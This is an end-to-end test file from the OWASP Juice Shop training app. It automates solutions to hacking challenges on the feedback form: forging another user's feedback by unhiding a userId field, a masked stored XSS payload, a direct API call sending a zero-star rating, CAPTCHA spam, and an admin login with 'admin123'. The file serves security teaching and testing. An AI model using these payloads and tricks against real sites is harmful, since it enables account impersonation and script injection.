/*
 * Copyright (c) 2014-2022 Bjoern Kimminich & the OWASP Juice Shop contributors.
 * SPDX-License-Identifier: MIT
 */

import config = require('config')
import { $, $$, browser, by, element, ElementFinder, protractor } from 'protractor'
import { basePath, beforeEachLogin, expectChallengeSolved } from './e2eHelpers'
import { Product } from '../../data/types'

const utils = require('../../lib/utils')
const pastebinLeakProduct = config.get<Product[]>('products').filter((product: Product) => product.keywordsForPastebinDataLeakChallenge)[0]

describe('/#/contact', () => {
  let comment: ElementFinder, rating: ElementFinder, submitButton: ElementFinder, captcha: ElementFinder, snackBar: ElementFinder

  beforeEach(() => {
    void browser.get(`${basePath}/#/contact`)
    comment = element(by.id('comment'))
    rating = element(by.id('rating'))
    captcha = element(by.id('captchaControl'))
    submitButton = element(by.id('submitButton'))
    snackBar = element(by.css('.mat-simple-snackbar-action.ng-star-inserted')).element(by.css('.mat-focus-indicator.mat-button.mat-button-base'))
    solveNextCaptcha()
  })

  describe('challenge "forgedFeedback"', () => {
    beforeEachLogin({ email: `admin@${config.get('application.domain')}`, password: 'admin123' })

    it('should be possible to provide feedback as another user', () => {
      const EC = protractor.ExpectedConditions
      void browser.executeScript('document.getElementById("userId").removeAttribute("hidden");')
      void browser.executeScript('document.getElementById("userId").removeAttribute("class");')
      void browser.wait(EC.visibilityOf($('#userId')), 5000)

      const UserId = element(by.id('userId'))
      void UserId.clear()
      void UserId.sendKeys('2')
      void comment.sendKeys('Picard stinks!')
      void rating.click()

      void submitButton.click()

      void browser.get(`${basePath}/#/administration`)
      expect($$('mat-row mat-cell.mat-column-user').last().getText()).toMatch('2')
    })

    expectChallengeSolved({ challenge: 'Forged Feedback' })
  })

  if (!utils.disableOnContainerEnv()) {
    describe('challenge "persistedXssFeedback"', () => {
      beforeEachLogin({ email: `admin@${config.get('application.domain')}`, password: 'admin123' })

      it('should be possible to trick the sanitization with a masked XSS attack', () => {
        const EC = protractor.ExpectedConditions

        void comment.sendKeys('<<script>Foo</script>iframe src="javascript:alert(`xss`)">')
        void rating.click()

        void submitButton.click()

        void browser.sleep(5000)

        void browser.waitForAngularEnabled(false)
        void browser.get(`${basePath}/#/about`)

        void browser.wait(EC.alertIsPresent(), 15000, "'xss' alert is not present on /#/about")
        void browser.switchTo().alert().then(alert => {
          expect(alert.getText()).toEqual(Promise.resolve('xss'))
          void alert.accept()
        })

        void browser.get(`${basePath}/#/administration`)
        void browser.wait(EC.alertIsPresent(), 15000, "'xss' alert is not present on /#/administration")
        void browser.switchTo().alert().then(alert => {
          expect(alert.getText()).toEqual(Promise.resolve('xss'))
          void alert.accept()
          void $$('.mat-cell.mat-column-remove > button').last().click()
          void browser.wait(EC.stalenessOf(element(by.tagName('iframe'))), 5000)
        })
        void browser.waitForAngularEnabled(true)
      })

      expectChallengeSolved({ challenge: 'Server-side XSS Protection' })
    })
  }

  describe('challenge "vulnerableComponent"', () => {
    it('should be possible to post known vulnerable component(s) as feedback', () => {
      void comment.sendKeys('sanitize-html 1.4.2 is non-recursive.')
      void comment.sendKeys('express-jwt 0.1.3 has broken crypto.')
      void rating.click()

      void submitButton.click()
    })

    expectChallengeSolved({ challenge: 'Vulnerable Library' })
  })

  describe('challenge "weirdCrypto"', () => {
    it('should be possible to post weird crypto algorithm/library as feedback', () => {
      void comment.sendKeys('The following libraries are bad for crypto: z85, base85, md5 and hashids')
      void rating.click()

      void submitButton.click()
    })

    expectChallengeSolved({ challenge: 'Weird Crypto' })
  })

  describe('challenge "typosquattingNpm"', () => {
    it('should be possible to post typosquatting NPM package as feedback', () => {
      void comment.sendKeys('You are a typosquatting victim of this NPM package: epilogue-js')
      void rating.click()

      void submitButton.click()
    })

    expectChallengeSolved({ challenge: 'Legacy Typosquatting' })
  })

  describe('challenge "typosquattingAngular"', () => {
    it('should be possible to post typosquatting Bower package as feedback', () => {
      void comment.sendKeys('You are a typosquatting victim of this Bower package: anuglar2-qrcode')
      void rating.click()

      void submitButton.click()
    })

    expectChallengeSolved({ challenge: 'Frontend Typosquatting' })
  })

  describe('challenge "hiddenImage"', () => {
    it('should be possible to post hidden character name as feedback', () => {
      void comment.sendKeys('Pickle Rick is hiding behind one of the support team ladies')
      void rating.click()

      void submitButton.click()
    })

    expectChallengeSolved({ challenge: 'Steganography' })
  })

  describe('challenge "zeroStars"', () => {
    it('should be possible to post feedback with zero stars by double-clicking rating widget', () => {
      void browser.executeAsyncScript((baseUrl: string) => {
        const callback = arguments[arguments.length - 1]
        const xhttp = new XMLHttpRequest()
        let captcha
        xhttp.onreadystatechange = function () {
          if (this.status === 200) {
            captcha = JSON.parse(this.responseText)
            sendPostRequest(captcha)
          }
        }

        xhttp.open('GET', `${baseUrl}/rest/captcha/`, true)
        xhttp.setRequestHeader('Content-type', 'text/plain')
        xhttp.send()

        function sendPostRequest (_captcha: { captchaId: number, answer: string}) {
          const xhttp = new XMLHttpRequest()
          xhttp.onreadystatechange = function () {
            if (this.status === 201) {
              console.log('Success')
              callback()
            }
          }

          xhttp.open('POST', `${baseUrl}/api/Feedbacks`, true)
          xhttp.setRequestHeader('Content-type', 'application/json')
          xhttp.send(JSON.stringify({"captchaId": _captcha.captchaId, "captcha": `${_captcha.answer}`, "comment": "Comment", "rating": 0})) // eslint-disable-line
        }
      }, browser.baseUrl)
    })

    expectChallengeSolved({ challenge: 'Zero Stars' })
  })

  describe('challenge "captchaBypass"', () => {
    const EC = protractor.ExpectedConditions
    xit('should be possible to post 10 or more customer feedbacks in less than 10 seconds', () => {
      void browser.waitForAngularEnabled(false)

      for (let i = 0; i < 11; i++) {
        void comment.sendKeys(`Spam #${i}`)
        void rating.click()
        void submitButton.click()
        void browser.wait(EC.visibilityOf(snackBar), 200, 'SnackBar did not become visible')
        void snackBar.click()
        void browser.sleep(200)
        solveNextCaptcha() // first CAPTCHA was already solved in beforeEach
      }

      void browser.waitForAngularEnabled(true)
    })

    // expectChallengeSolved({ challenge: 'CAPTCHA Bypass' })
  })

  describe('challenge "supplyChainAttack"', () => {
    it('should be possible to post GitHub issue URL reporting malicious eslint-scope package as feedback', () => {
      void comment.sendKeys('Turn on 2FA! Now!!! https://github.com/eslint/eslint-scope/issues/39')
      void rating.click()

      void submitButton.click()
    })

    expectChallengeSolved({ challenge: 'Supply Chain Attack' })
  })

  describe('challenge "dlpPastebinDataLeak"', () => {
    it('should be possible to post dangerous ingredients of unsafe product as feedback', () => {
      void comment.sendKeys(pastebinLeakProduct.keywordsForPastebinDataLeakChallenge.toString())
      void rating.click()
      void submitButton.click()
    })
    expectChallengeSolved({ challenge: 'Leaked Unsafe Product' })
  })

  function solveNextCaptcha () {
    void element(by.id('captcha')).getText().then((text) => {
      void captcha.clear()
      const answer = eval(text).toString() // eslint-disable-line no-eval
      void captcha.sendKeys(answer)
    })
  }
})
